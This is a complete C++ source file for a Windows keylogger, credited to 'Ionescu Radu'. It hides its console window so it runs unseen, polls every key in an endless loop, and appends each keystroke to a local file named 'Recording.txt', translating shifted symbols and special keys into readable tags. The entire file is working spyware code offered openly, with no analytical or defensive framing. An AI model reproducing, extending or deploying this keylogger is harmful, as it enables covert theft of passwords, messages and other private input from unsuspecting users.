#include<Windows.h>
#include<WinUser.h>
#include<iostream>
#include<fstream>

using namespace std;

//[[<<===~~~--- Created by Ionescu Radu ---~~~===>>]]//

void hideConsoleWindow()
{
	HWND consoleWindow;
	AllocConsole();
	consoleWindow = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(consoleWindow, 0);
}

int main(int argc, char* argv[])
{
	ofstream log("Recording.txt", ios::app);
	hideConsoleWindow();
	unsigned char pressedKey;

	while (true)
	{
		Sleep(0);

		for (pressedKey = 8; pressedKey <= 255; pressedKey++)
		{
			if (GetAsyncKeyState(pressedKey) == -32767)
			{
				// Capital letters
				if (pressedKey >= 0x41 && pressedKey <= 0x5A && !GetAsyncKeyState(VK_SHIFT)) 
				{
					pressedKey += 32;
					log << pressedKey;
				}
				// Small letters
				else if (pressedKey >= 0x41 && pressedKey <= 0x5A && GetAsyncKeyState(VK_SHIFT))
				{
					log << pressedKey;
				}
				// Digits
				else if (pressedKey >= 0x30 && pressedKey <= 0x39 && !GetAsyncKeyState(VK_SHIFT))
				{
					log << pressedKey;
				}
				else if (GetAsyncKeyState(VK_SHIFT))
				{
					switch (pressedKey)
					{
					// Shift + Space
					case VK_SPACE: log << " "; break;

					// Shift + Special character
					case VK_OEM_1: log << ":"; break;
					case VK_OEM_2: log << "?"; break;
					case VK_OEM_3: log << "~"; break;
					case VK_OEM_4: log << "{"; break;
					case VK_OEM_5: log << "|"; break;
					case VK_OEM_6: log << "}"; break;
					case VK_OEM_7: log << "\""; break;

					case VK_OEM_PERIOD: log << ">"; break;
					case VK_OEM_COMMA: log << "<"; break;
					case VK_OEM_MINUS: log << "_"; break;
					case VK_OEM_PLUS: log << "+"; break;

					// Shift + Digit
					case 0x30: log << ")"; break;
					case 0x31: log << "!"; break;
					case 0x32: log << "@"; break;
					case 0x33: log << "#"; break;
					case 0x34: log << "$"; break;
					case 0x35: log << "%"; break;
					case 0x36: log << "^"; break;
					case 0x37: log << "&"; break;
					case 0x38: log << "*"; break;
					case 0x39: log << "("; break;
					}
				}
				else
				{
					switch (pressedKey)
					{
					// Space
					case VK_SPACE: log << " "; break;

					// Special character
					case VK_OEM_1: log << ";"; break;
					case VK_OEM_2: log << "/"; break;
					case VK_OEM_3: log << "`"; break;
					case VK_OEM_4: log << "["; break;
					case VK_OEM_5: log << "\\"; break;
					case VK_OEM_6: log << "]"; break;
					case VK_OEM_7: log << "\'"; break;

					case VK_OEM_PERIOD: log << "."; break;
					case VK_OEM_COMMA: log << ","; break;
					case VK_OEM_MINUS: log << "-"; break;
					case VK_OEM_PLUS: log << "="; break;

					// Special key, Arrows
					case VK_RETURN: log << "<ENTER>\n"; break;
					case VK_BACK: log << "<BACKSPACE>"; break;

					case VK_DELETE: log << "<DELETE>"; break;
					case VK_INSERT: log << "<INSERT>"; break;
					case VK_END: log << "<END>"; break;
					case VK_HOME: log << "<HOME>"; break;
					case VK_PRIOR: log << "<PAGE UP>"; break;
					case VK_NEXT: log << "<PAGE DOWN>"; break;

					case VK_PRINT: log << "<PRINT SCREEN>"; break;
					case VK_SCROLL: log << "<SCROLL LOCK>"; break;
					case VK_PAUSE: log << "<PAUSE BREAK>"; break;

					case VK_ESCAPE: log << "<ESCAPE>"; break;
					case VK_TAB: log << "<TAB>"; break;
					case VK_CAPITAL: log << "<CAPS LOCK>"; break;

					case VK_LWIN: log << "<WINDOWS>"; break;

					case VK_UP: log << "<UP ARROW>"; break;
					case VK_DOWN: log << "<DOWN ARROW>"; break;
					case VK_LEFT: log << "<LEFT ARROW>"; break;
					case VK_RIGHT: log << "<RIGHT ARROW>"; break;

					// Function keys
					case VK_F1: log << "<F1>"; break;
					case VK_F2: log << "<F2>"; break;
					case VK_F3: log << "<F3>"; break;
					case VK_F4: log << "<F4>"; break;
					case VK_F5: log << "<F5>"; break;
					case VK_F6: log << "<F6>"; break;
					case VK_F7: log << "<F7>"; break;
					case VK_F8: log << "<F8>"; break;
					case VK_F9: log << "<F9>"; break;
					case VK_F10: log << "<F10>"; break;
					case VK_F11: log << "<F11>"; break;
					case VK_F12: log << "<F12>"; break;
					}
				}
				log.flush();
			}
		}
	}
}